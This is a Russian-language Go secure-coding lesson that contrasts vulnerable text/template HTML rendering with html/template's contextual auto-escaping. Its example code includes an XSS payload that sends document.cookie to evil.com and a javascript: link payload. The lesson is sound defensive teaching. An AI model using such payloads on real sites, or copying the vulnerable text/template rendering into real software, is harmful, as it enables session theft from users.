# XSS (Cross-Site Scripting): text/template vs html/template

## Условие

Напишите обработчик, который выводит введенный пользователем текст в HTML. Используйте text/template (уязвимо) и покажите внедрение &lt;script>alert(1)&lt;/script>. Перепишите на html/template с контекстным автоэкранированием и объясните разницу.

### Исходная формулировка

**[XSS (Cross-Site Scripting)]**: Напиши обработчик, который выводит введенный пользователем текст в HTML. Используй `text/template` (уязвимо) и покажи внедрение `<script>alert(1)</script>`. Перепиши на `html/template`, который автоматически экранирует HTML-сущности.

## Теория

XSS (Cross-Site Scripting) — уязвимость, позволяющая внедрять произвольный вредоносный JavaScript-код в веб-страницы, просматриваемые другими пользователями.

В стандартной библиотеке Go есть два пакета шаблонизации:
1. `text/template`: осуществляет простую текстовую подстановку без анализа синтаксиса целевого документа. Любой внедренный HTML-тег (`<script>`, `<img onerror=...>`, `<svg onload=...>`) попадает в результирующий поток байт «как есть». Использование `text/template` для генерации HTML — **критическая ошибка**!
2. `html/template`: реализует **контекстно-зависимое автоэкранирование (Context-aware Auto-escaping)**.
   Парсер шаблонизатора анализирует структуру HTML/CSS/JS в точке вставки:
   - Внутри HTML-тела: экранирует `<` в `&lt;`, `>` в `&gt;`, `&` в `&amp;`.
   - Внутри атрибутов (`<a href="...">`): экранирует кавычки и проверяет схему (`javascript:` фильтруется).
   - Внутри `<script>`: применяет сериализацию в безопасный JSON/JS литерал.
   - Внутри CSS: блокирует внедрение `expression(...)` и опасных URL.

## Решение по шагам

1. Создайте опасный HTML-шаблон с использованием `text/template`.
2. Передайте вредоносную полезную нагрузку: `<script>alert('XSS Steal Cookies: ' + document.cookie)</script>`.
3. Покажите сгенерированный уязвимый HTML с неэкранированным скриптом.
4. Перепишите шаблон с использованием пакета `html/template`.
5. Передайте ту же полезную нагрузку и продемонстрируйте безопасный вывод с HTML-сущностями (`&lt;script&gt;...`).
6. Покажите, как `html/template` экранирует данные в атрибутах тегов.

## Код решения

**`main.go`**

```go
package main

import (
	"bytes"
	"fmt"
	htmlTmpl "html/template"
	textTmpl "text/template"
)

type UserComment struct {
	Author string
	Body   string
	Link   string
}

func RenderWithTextTemplate(c UserComment) string {
	const tmpl = `
<div class="comment">
	<h3>Author: {{.Author}}</h3>
	<p>{{.Body}}</p>
	<a href="{{.Link}}">Profile</a>
</div>`

	t := textTmpl.Must(textTmpl.New("text").Parse(tmpl))
	var buf bytes.Buffer
	_ = t.Execute(&buf, c)
	return buf.String()
}

func RenderWithHTMLTemplate(c UserComment) string {
	const tmpl = `
<div class="comment">
	<h3>Author: {{.Author}}</h3>
	<p>{{.Body}}</p>
	<a href="{{.Link}}">Profile</a>
</div>`

	t := htmlTmpl.Must(htmlTmpl.New("html").Parse(tmpl))
	var buf bytes.Buffer
	_ = t.Execute(&buf, c)
	return buf.String()
}

func main() {
	maliciousInput := UserComment{
		Author: "Hacker",
		Body:   "<script>fetch('https://evil.com/steal?c=' + document.cookie)</script>",
		Link:   "javascript:alert('Stealing Tokens!')",
	}

	fmt.Println("=== 1. УЯЗВИМЫЙ ВЫВОД (text/template) ===")
	vulnOutput := RenderWithTextTemplate(maliciousInput)
	fmt.Println(vulnOutput)

	fmt.Println("=== 2. ЗАЩИЩЕННЫЙ ВЫВОД (html/template) ===")
	safeOutput := RenderWithHTMLTemplate(maliciousInput)
	fmt.Println(safeOutput)
}
```

## Под капотом

Как работает контекстное автоэкранирование в `html/template`:
Пакет парсит шаблон как конечный автомат грамматики HTML5/CSS/JavaScript. В зависимости от текущего состояния парсера:
1. Состояние `stateText`: переменная экранируется через `htmlEscaper` (`<` -> `&lt;`, `"` -> `&#34;`).
2. Состояние `stateAttr`: если атрибут является ссылочным (`href`, `src`, `action`), применяется санитизатор URL. Если значение начинается с псевдосхемы `javascript:`, Go заменяет весь URL на `#ZgotmplZ` (специальный маркер отфильтрованного небезопасного значения).
3. Состояние `stateJS`: экранирует служебные символы в unicode escape (`\u003cscript\u003e`), предотвращая выход из контекста строки JavaScript.

## Подводные камни

1. Использование типа `template.HTML(untrusted)`: разработчики часто используют приведение `template.HTML(str)` чтобы «убрать кракозябры &amp;lt;...&amp;gt;», когда пользователь вводит форматированный текст. Это полностью отключает все проверки безопасности и открывает прямую дыру для Stored XSS!
2. Для форматированного пользовательского HTML (Markdown, WYSIWYG) используйте специализированные санитизаторы с белым списком тегов и атрибутов (например, `github.com/microcosm-cc/bluemonday`).

## На собеседовании

**Вопрос с собеседования:** Что означает маркер `#ZgotmplZ` в выводе шаблона Go `html/template`?
**Ответ:** `#ZgotmplZ` — это внутренняя константа безопасности пакета `html/template`. Когда шаблонизатор обнаруживает в контексте URL (например, в атрибуте `href` или `src`) потенциально вредоносную схему (`javascript:`, `vbscript:`, `data:text/html`), он заменяет всё значение на `#ZgotmplZ`. Это предотвращает выполнение XSS и сигнализирует разработчикам об обнаружении опасного контента при валидации шаблона.
